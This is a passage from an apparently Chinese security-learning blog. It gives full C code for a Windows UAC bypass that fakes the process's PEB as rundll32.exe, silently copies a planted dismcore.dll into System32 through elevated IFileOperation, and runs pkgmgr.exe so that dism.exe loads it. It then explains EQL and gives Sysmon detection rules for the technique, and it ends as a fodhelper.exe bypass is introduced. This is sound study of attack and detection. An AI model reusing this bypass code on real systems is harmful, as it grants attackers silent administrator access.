class="line"></span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    SIZE_T HeapSegmentReserve;</span><br><span class="line">    SIZE_T HeapSegmentCommit;</span><br><span class="line">    SIZE_T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    SIZE_T HeapDeCommitFreeBlockThreshold;</span><br><span class="line"></span><br><span class="line">    ULONG NumberOfHeaps;</span><br><span class="line">    ULONG MaximumNumberOfHeaps;</span><br><span class="line">    PVOID* ProcessHeaps;</span><br><span class="line"></span><br><span class="line">    PVOID GdiSharedHandleTable;</span><br><span class="line">    PVOID ProcessStarterHelper;</span><br><span class="line">    ULONG GdiDCAttributeList;</span><br><span class="line"></span><br><span class="line">    PRTL_CRITICAL_SECTION LoaderLock;</span><br><span class="line"></span><br><span class="line">    ULONG OSMajorVersion;</span><br><span class="line">    ULONG OSMinorVersion;</span><br><span class="line">    USHORT OSBuildNumber;</span><br><span class="line">    USHORT OSCSDVersion;</span><br><span class="line">    ULONG OSPlatformId;</span><br><span class="line">    ULONG ImageSubsystem;</span><br><span class="line">    ULONG ImageSubsystemMajorVersion;</span><br><span class="line">    ULONG ImageSubsystemMinorVersion;</span><br><span class="line">    ULONG_PTR ImageProcessAffinityMask;</span><br><span class="line">    GDI_HANDLE_BUFFER GdiHandleBuffer;</span><br><span class="line">    PVOID PostProcessInitRoutine;</span><br><span class="line"></span><br><span class="line">    PVOID TlsExpansionBitmap;</span><br><span class="line">    ULONG TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    ULONG SessionId;</span><br><span class="line"></span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    PVOID pShimData;</span><br><span class="line">    PVOID AppCompatInfo;</span><br><span class="line"></span><br><span class="line">    UNICODE_STRING CSDVersion;</span><br><span class="line"></span><br><span class="line">    PVOID ActivationContextData;</span><br><span class="line">    PVOID ProcessAssemblyStorageMap;</span><br><span class="line">    PVOID SystemDefaultActivationContextData;</span><br><span class="line">    PVOID SystemAssemblyStorageMap;</span><br><span class="line"></span><br><span class="line">    SIZE_T MinimumStackCommit;</span><br><span class="line"></span><br><span class="line">    PVOID* FlsCallback;</span><br><span class="line">    LIST_ENTRY FlsListHead;</span><br><span class="line">    PVOID FlsBitmap;</span><br><span class="line">    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (<span class="keyword">sizeof</span>(ULONG) * <span class="number">8</span>)];</span><br><span class="line">    ULONG FlsHighIndex;</span><br><span class="line"></span><br><span class="line">    PVOID WerRegistrationData;</span><br><span class="line">    PVOID WerShipAssertPtr;</span><br><span class="line">    PVOID pContextData;</span><br><span class="line">    PVOID pImageHeaderHash;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG TracingFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG HeapTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG CritSecTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG LibLoaderTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG SpareTracingBits : <span class="number">29</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONGLONG CsrServerReadOnlySharedMemoryBase;</span><br><span class="line">&#125; PEB, * PPEB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GDI_TEB_BATCH</span> &#123;</span></span><br><span class="line">    ULONG	Offset;</span><br><span class="line">    UCHAR	Alignment[<span class="number">4</span>];</span><br><span class="line">    ULONG_PTR HDC;</span><br><span class="line">    ULONG	Buffer[GDI_BATCH_BUFFER_SIZE];</span><br><span class="line">&#125; GDI_TEB_BATCH, * PGDI_TEB_BATCH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME_CONTEXT</span> &#123;</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PSTR FrameName;</span><br><span class="line">&#125; TEB_ACTIVE_FRAME_CONTEXT, * PTEB_ACTIVE_FRAME_CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME</span> &#123;</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME</span>* <span class="title">Previous</span>;</span></span><br><span class="line">    PTEB_ACTIVE_FRAME_CONTEXT Context;</span><br><span class="line">&#125; TEB_ACTIVE_FRAME, * PTEB_ACTIVE_FRAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TEB</span> &#123;</span></span><br><span class="line">    NT_TIB NtTib;</span><br><span class="line"></span><br><span class="line">    PVOID EnvironmentPointer;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    PVOID ActiveRpcHandle;</span><br><span class="line">    PVOID ThreadLocalStoragePointer;</span><br><span class="line">    PPEB ProcessEnvironmentBlock;</span><br><span class="line"></span><br><span class="line">    ULONG LastErrorValue;</span><br><span class="line">    ULONG CountOfOwnedCriticalSections;</span><br><span class="line">    PVOID CsrClientThread;</span><br><span class="line">    PVOID Win32ThreadInfo;</span><br><span class="line">    ULONG User32Reserved[<span class="number">26</span>];</span><br><span class="line">    ULONG UserReserved[<span class="number">5</span>];</span><br><span class="line">    PVOID WOW32Reserved;</span><br><span class="line">    LCID CurrentLocale;</span><br><span class="line">    ULONG FpSoftwareStatusRegister;</span><br><span class="line">    PVOID SystemReserved1[<span class="number">54</span>];</span><br><span class="line">    NTSTATUS ExceptionCode;</span><br><span class="line">    PVOID ActivationContextStackPointer;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">24</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">36</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ULONG TxFsContext;</span><br><span class="line"></span><br><span class="line">    GDI_TEB_BATCH GdiTebBatch;</span><br><span class="line">    CLIENT_ID RealClientId;</span><br><span class="line">    HANDLE GdiCachedProcessHandle;</span><br><span class="line">    ULONG GdiClientPID;</span><br><span class="line">    ULONG GdiClientTID;</span><br><span class="line">    PVOID GdiThreadLocalInfo;</span><br><span class="line">    ULONG_PTR Win32ClientInfo[<span class="number">62</span>];</span><br><span class="line">    PVOID glDispatchTable[<span class="number">233</span>];</span><br><span class="line">    ULONG_PTR glReserved1[<span class="number">29</span>];</span><br><span class="line">    PVOID glReserved2;</span><br><span class="line">    PVOID glSectionInfo;</span><br><span class="line">    PVOID glSection;</span><br><span class="line">    PVOID glTable;</span><br><span class="line">    PVOID glCurrentRC;</span><br><span class="line">    PVOID glContext;</span><br><span class="line"></span><br><span class="line">    NTSTATUS LastStatusValue;</span><br><span class="line">    UNICODE_STRING StaticUnicodeString;</span><br><span class="line">    WCHAR StaticUnicodeBuffer[<span class="number">261</span>];</span><br><span class="line"></span><br><span class="line">    PVOID DeallocationStack;</span><br><span class="line">    PVOID TlsSlots[<span class="number">64</span>];</span><br><span class="line">    LIST_ENTRY TlsLinks;</span><br><span class="line"></span><br><span class="line">    PVOID Vdm;</span><br><span class="line">    PVOID ReservedForNtRpc;</span><br><span class="line">    PVOID DbgSsReserved[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    ULONG HardErrorMode;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    PVOID Instrumentation[<span class="number">11</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID Instrumentation[<span class="number">9</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    GUID ActivityId;</span><br><span class="line"></span><br><span class="line">    PVOID SubProcessTag;</span><br><span class="line">    PVOID EtwLocalData;</span><br><span class="line">    PVOID EtwTraceData;</span><br><span class="line">    PVOID WinSockData;</span><br><span class="line">    ULONG GdiBatchCount;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        PROCESSOR_NUMBER CurrentIdealProcessor;</span><br><span class="line">        ULONG IdealProcessorValue;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR ReservedPad0;</span><br><span class="line">            UCHAR ReservedPad1;</span><br><span class="line">            UCHAR ReservedPad2;</span><br><span class="line">            UCHAR IdealProcessor;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ULONG GuaranteedStackBytes;</span><br><span class="line">    PVOID ReservedForPerf;</span><br><span class="line">    PVOID ReservedForOle;</span><br><span class="line">    ULONG WaitingOnLoaderLock;</span><br><span class="line">    PVOID SavedPriorityState;</span><br><span class="line">    ULONG_PTR SoftPatchPtr1;</span><br><span class="line">    PVOID ThreadPoolData;</span><br><span class="line">    PVOID* TlsExpansionSlots;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    PVOID DeallocationBStore;</span><br><span class="line">    PVOID BStoreLimit;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ULONG MuiGeneration;</span><br><span class="line">    ULONG IsImpersonating;</span><br><span class="line">    PVOID NlsCache;</span><br><span class="line">    PVOID pShimData;</span><br><span class="line">    ULONG HeapVirtualAffinity;</span><br><span class="line">    HANDLE CurrentTransactionHandle;</span><br><span class="line">    PTEB_ACTIVE_FRAME ActiveFrame;</span><br><span class="line">    PVOID FlsData;</span><br><span class="line"></span><br><span class="line">    PVOID PreferredLanguages;</span><br><span class="line">    PVOID UserPrefLanguages;</span><br><span class="line">    PVOID MergedPrefLanguages;</span><br><span class="line">    ULONG MuiImpersonation;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        USHORT CrossTebFlags;</span><br><span class="line">        USHORT SpareCrossTebBits : <span class="number">16</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        USHORT SameTebFlags;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            USHORT SafeThunkCall : <span class="number">1</span>;</span><br><span class="line">            USHORT InDebugPrint : <span class="number">1</span>;</span><br><span class="line">            USHORT HasFiberData : <span class="number">1</span>;</span><br><span class="line">            USHORT SkipThreadAttach : <span class="number">1</span>;</span><br><span class="line">            USHORT WerInShipAssertCode : <span class="number">1</span>;</span><br><span class="line">            USHORT RanProcessInit : <span class="number">1</span>;</span><br><span class="line">            USHORT ClonedThread : <span class="number">1</span>;</span><br><span class="line">            USHORT SuppressDebugMsg : <span class="number">1</span>;</span><br><span class="line">            USHORT DisableUserStackWalk : <span class="number">1</span>;</span><br><span class="line">            USHORT RtlExceptionAttached : <span class="number">1</span>;</span><br><span class="line">            USHORT InitialThread : <span class="number">1</span>;</span><br><span class="line">            USHORT SpareSameTebBits : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    PVOID TxnScopeEnterCallback;</span><br><span class="line">    PVOID TxnScopeExitCallback;</span><br><span class="line">    PVOID TxnScopeContext;</span><br><span class="line">    ULONG LockCount;</span><br><span class="line">    ULONG SpareUlong0;</span><br><span class="line">    PVOID ResourceRetValue;</span><br><span class="line">&#125; TEB, * PTEB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span><span class="params">(NTAPI* PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_    PCLDR_DATA_TABLE_ENTRY DataTableEntry,</span></span><br><span class="line"><span class="params">    _In_    PVOID Context,</span></span><br><span class="line"><span class="params">    _Inout_ BOOLEAN* StopEnumeration</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> PVOID NTAPI <span class="title function_">RTLINITUNICODESTRING</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Inout_	PUNICODE_STRING DestinationString,</span></span><br><span class="line"><span class="params">    _In_opt_ PCWSTR SourceString</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="keyword">typedef</span> RTLINITUNICODESTRING FAR* LPRTLINITUNICODESTRING;</span><br><span class="line">LPRTLINITUNICODESTRING			RtlInitUnicodeString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> NTSTATUS NTAPI <span class="title function_">RTLENTERCRITICALSECTION</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PRTL_CRITICAL_SECTION CriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="keyword">typedef</span> RTLENTERCRITICALSECTION FAR* LPRTLENTERCRITICALSECTION;</span><br><span class="line">LPRTLENTERCRITICALSECTION			RtlEnterCriticalSection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> NTSTATUS NTAPI <span class="title function_">RTLLEAVECRITICALSECTION</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PRTL_CRITICAL_SECTION CriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="keyword">typedef</span> RTLLEAVECRITICALSECTION FAR* LPRTLLEAVECRITICALSECTION;</span><br><span class="line">LPRTLLEAVECRITICALSECTION			RtlLeaveCriticalSection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> NTSTATUS NTAPI <span class="title function_">LDRENUMERATELOADEDMODULES</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_opt_ ULONG Flags,</span></span><br><span class="line"><span class="params">    _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID Context)</span>;</span><br><span class="line"><span class="keyword">typedef</span> LDRENUMERATELOADEDMODULES FAR* LPLDRENUMERATELOADEDMODULES;</span><br><span class="line">LPLDRENUMERATELOADEDMODULES			LdrEnumerateLoadedModules;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> NTSTATUS NTAPI <span class="title function_">NTALLOCATEVIRTUALMEMORY</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_        HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">    _Inout_     PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">    _In_        ULONG_PTR ZeroBits,</span></span><br><span class="line"><span class="params">    _Inout_     PSIZE_T RegionSize,</span></span><br><span class="line"><span class="params">    _In_        ULONG AllocationType,</span></span><br><span class="line"><span class="params">    _In_        ULONG Protect</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="keyword">typedef</span> NTALLOCATEVIRTUALMEMORY FAR* LPNTALLOCATEVIRTUALMEMORY;</span><br><span class="line">LPNTALLOCATEVIRTUALMEMORY	NtAllocateVirtualMemory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LPWSTR g_lpszRundll = <span class="string">L&quot;C:\\windows\\system32\\rundll32.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">VOID NTAPI <span class="title function_">supxLdrEnumModulesCallback</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,</span></span><br><span class="line"><span class="params">    _In_ PVOID Context,</span></span><br><span class="line"><span class="params">    _Inout_ BOOLEAN* StopEnumeration</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    PPEB Peb = (PPEB)Context;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (DataTableEntry-&gt;DllBase == Peb-&gt;ImageBaseAddress) &#123;</span><br><span class="line">        RtlInitUnicodeString(&amp;DataTableEntry-&gt;FullDllName, g_lpszRundll);</span><br><span class="line">        RtlInitUnicodeString(&amp;DataTableEntry-&gt;BaseDllName, <span class="string">L&quot;rundll32.exe&quot;</span>);</span><br><span class="line">        *StopEnumeration = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        *StopEnumeration = FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__inline <span class="keyword">struct</span> _PEB* <span class="title function_">NtCurrentPeb</span><span class="params">()</span> &#123; <span class="keyword">return</span> NtCurrentTeb()-&gt;ProcessEnvironmentBlock; &#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">supMasqueradeProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">    VOID</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    PPEB    Peb = NtCurrentPeb();</span><br><span class="line">    SIZE_T  RegionSize;</span><br><span class="line"></span><br><span class="line">    PVOID g_lpszExplorer = <span class="literal">NULL</span>;</span><br><span class="line">    RegionSize = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    Status = NtAllocateVirtualMemory(</span><br><span class="line">        NtCurrentProcess(),</span><br><span class="line">        &amp;g_lpszExplorer,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;RegionSize,</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NT_SUCCESS(Status)) &#123;</span><br><span class="line">        RtlEnterCriticalSection(Peb-&gt;FastPebLock);</span><br><span class="line"></span><br><span class="line">        RtlInitUnicodeString(&amp;Peb-&gt;ProcessParameters-&gt;ImagePathName, g_lpszRundll);</span><br><span class="line">        RtlInitUnicodeString(&amp;Peb-&gt;ProcessParameters-&gt;CommandLine, g_lpszRundll);</span><br><span class="line"></span><br><span class="line">        RtlLeaveCriticalSection(Peb-&gt;FastPebLock);</span><br><span class="line"></span><br><span class="line">        LdrEnumerateLoadedModules(<span class="number">0</span>, &amp;supxLdrEnumModulesCallback, (PVOID)Peb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, CHAR* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hinstStub = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hinstStub)</span><br><span class="line">    &#123;</span><br><span class="line">        RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(hinstStub, <span class="string">&quot;RtlInitUnicodeString&quot;</span>);</span><br><span class="line">        RtlEnterCriticalSection = (LPRTLENTERCRITICALSECTION)GetProcAddress(hinstStub, <span class="string">&quot;RtlEnterCriticalSection&quot;</span>);</span><br><span class="line">        RtlLeaveCriticalSection = (LPRTLLEAVECRITICALSECTION)GetProcAddress(hinstStub, <span class="string">&quot;RtlLeaveCriticalSection&quot;</span>);</span><br><span class="line">        LdrEnumerateLoadedModules = (LPLDRENUMERATELOADEDMODULES)GetProcAddress(hinstStub, <span class="string">&quot;LdrEnumerateLoadedModules&quot;</span>);</span><br><span class="line"></span><br><span class="line">        NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(hinstStub, <span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!NtAllocateVirtualMemory || !RtlInitUnicodeString || !RtlEnterCriticalSection || !RtlLeaveCriticalSection || !LdrEnumerateLoadedModules )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Could not find ... in NTDLL.DLL&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Could not GetModuleHandle of NTDLL.DLL&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    supMasqueradeProcess();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin move dll by IFileOperation&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    HMODULE hModule = <span class="literal">NULL</span>;</span><br><span class="line">    IFileOperation* fileOperation = <span class="literal">NULL</span>;</span><br><span class="line">    LPCWSTR DFileName = <span class="string">L&quot;dismcore.dll&quot;</span>;</span><br><span class="line">    LPCWSTR SourceFullPath = <span class="string">L&quot;C:\\ProgramData\\dismcore.dll&quot;</span>;</span><br><span class="line">    LPCWSTR DestPath = <span class="string">L&quot;C:\\windows\\System32&quot;</span>;</span><br><span class="line">    HRESULT hr = CoInitializeEx(<span class="literal">NULL</span>, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);</span><br><span class="line">    <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line"></span><br><span class="line">        hr = CoCreateInstance(CLSID_FileOperation, <span class="literal">NULL</span>, CLSCTX_ALL, IID_PPV_ARGS(&amp;fileOperation));</span><br><span class="line">        <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">            DWORD flags = <span class="number">0</span>;</span><br><span class="line">            PPEB pPeb = NtCurrentPeb();  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] Detected OS Build Number: %d\n&quot;</span>, pPeb-&gt;OSBuildNumber);</span><br><span class="line">            <span class="keyword">if</span> (pPeb-&gt;OSBuildNumber &gt; <span class="number">14997</span>) &#123;</span><br><span class="line">                flags = FOF_NOCONFIRMATION | </span><br><span class="line">                        FOFX_NOCOPYHOOKS | </span><br><span class="line">                        FOFX_REQUIREELEVATION;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                flags = FOF_NOCONFIRMATION | </span><br><span class="line">                        FOF_SILENT | </span><br><span class="line">                        FOFX_SHOWELEVATIONPROMPT | </span><br><span class="line">                        FOFX_NOCOPYHOOKS | </span><br><span class="line">                        FOFX_REQUIREELEVATION |</span><br><span class="line">                        FOF_NOERRORUI;</span><br><span class="line">            &#125;</span><br><span class="line">            hr = fileOperation-&gt;SetOperationFlags(flags);</span><br><span class="line">            <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">                IShellItem* from = <span class="literal">NULL</span>, * to = <span class="literal">NULL</span>;</span><br><span class="line">                hr = SHCreateItemFromParsingName(SourceFullPath, <span class="literal">NULL</span>, IID_PPV_ARGS(&amp;from));</span><br><span class="line">                <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (DestPath)</span><br><span class="line">                        hr = SHCreateItemFromParsingName(DestPath, <span class="literal">NULL</span>, IID_PPV_ARGS(&amp;to));</span><br><span class="line">                    <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">                        hr = fileOperation-&gt;CopyItem(from, to, DFileName, <span class="literal">NULL</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="literal">NULL</span> != to)</span><br><span class="line">                            to-&gt;Release();</span><br><span class="line">                    &#125;</span><br><span class="line">                    from-&gt;Release();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (SUCCEEDED(hr)) &#123;</span><br><span class="line">                    hr = fileOperation-&gt;PerformOperations();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            fileOperation-&gt;Release();</span><br><span class="line">        &#125;</span><br><span class="line">        CoUninitialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin run pkgmgr.exe&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ShellExecuteA(<span class="literal">NULL</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;pkgmgr.exe&quot;</span>, <span class="string">&quot;/iu:TelnetClient&quot;</span>, <span class="literal">NULL</span>, SW_SHOWNORMAL))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ShellExecute failed (%d)&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在windows 10 19044成功实现 <code>IFileOperation</code>往高权限目录system32写dll文件。</p>
<p><img src="/image/2025-12-30-learning_windows_4/1770623080528.png" alt="1770623080528"></p>
<h6 id="EQL基本语法"><a href="#EQL基本语法" class="headerlink" title="EQL基本语法"></a>EQL基本语法</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sequence with maxspan=5s</span><br><span class="line">  [事件1]</span><br><span class="line">  [事件2]</span><br><span class="line">  [事件3]</span><br></pre></td></tr></table></figure>

<p>sequence ：告诉引擎这些事件必须按时间顺序发生（1 -&gt; 2 -&gt; 3）。</p>
<p>maxspan&#x3D;5s ： 最大时间跨度 。表示从“事件1”开始到“事件3”结束，整个过程不能超过 5 秒。</p>
<p>[any where …]</p>
<p>any ：表示匹配任意类型的事件</p>
<p>where ：后面跟具体的过滤条件。</p>
<p>字段名 ：</p>
<ul>
<li>winlog.event_id：事件 ID（1&#x3D;进程创建, 7&#x3D;镜像加载，11&#x3D;文件创建）。</li>
<li>winlog.event_data.Image：进程路径。</li>
<li>winlog.event_data.TargetFilename：目标文件。</li>
<li>winlog.event_data.ParentImage：父进程。</li>
<li>regex ：正则表达式匹配。<ul>
<li>例：<code>regex &quot;.DllHost</code>(正则匹配中<code>.</code>需要反斜杠来转义)</li>
<li>注意 ：EQL 中反斜杠 <code>\</code> 需要转义，所以写路径时要用 ``。</li>
</ul>
</li>
<li>stringContains （或者直接用<code>:</code>）：包含字符串。</li>
</ul>
<h6 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h6><p>该提权过程必然发生两件事</p>
<ul>
<li>文件创建 ：通过IFileOperation越权写dismcore.dll到sysmon32下</li>
<li>进程创建：恶意程序会启动pkgmgr.exe，pkgmgr.exe启动dism.exe，dism.exe加载一个位于system32下的dismcore.dll</li>
</ul>
<p>其他博主给出的检测规则如下，虽然最大时间时间跨度存在问题，因为只要写入dll后续任何时间都可以进行劫持，但是在进行实验时发现windows defender会延时删除往system32里写入的dll，因此恶意软件若想立刻避开只能抢在删除前立刻执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sequence with maxspan=5s</span><br><span class="line">      [any where winlog.event_id==11 and winlog.event_data.Image regex &quot;.*DllHost\\.exe.*&quot; and winlog.event_data.TargetFilename regex &quot;.*dismcore\\.dll&quot;]</span><br><span class="line">      [any where winlog.event_id==1 and winlog.event_data.Image regex &quot;.*PkgMgr\\.exe.*&quot;]  </span><br><span class="line">      [any where winlog.event_id==1 and winlog.event_data.Image regex &quot;.*Dism\\.exe&quot; and winlog.event_data.ParentImage regex &quot;.*PkgMgr\\.exe&quot;]</span><br></pre></td></tr></table></figure>

<p>博主写了个规则用于检测是否有进程向 <code>System32</code> 根目录写入了那 5 个不该出现在那里的 DLL。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">any where winlog.event_id == 11 and </span><br><span class="line">winlog.event_data.TargetFilename regex &quot;.*\\\\System32\\\\[^\\\\]+\\.dll&quot; and</span><br><span class="line">winlog.event_data.TargetFilename regex &quot;.*(dismcore|folderprovider|dismprov|logprovider|dismcoreps)\\.dll&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/image/2026-02-08-learning_windows_6/1770637949454.png" alt="1770637949454"></p>
<h5 id="通过注册表篡改pe执行逻辑"><a href="#通过注册表篡改pe执行逻辑" class="headerlink" title="通过注册表篡改pe执行逻辑"></a>通过注册表篡改pe执行逻辑</h5><h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p>利用 <code>fodhelper.exe</code>（Windows“按需功能”助手）。该程序位于可信目录（System32）下，且 Manifest 中包含 <code>&lt;autoElevate&gt;true&lt;/autoElevate&gt;</code>，因此它可以不弹窗自动提权运行。</p>
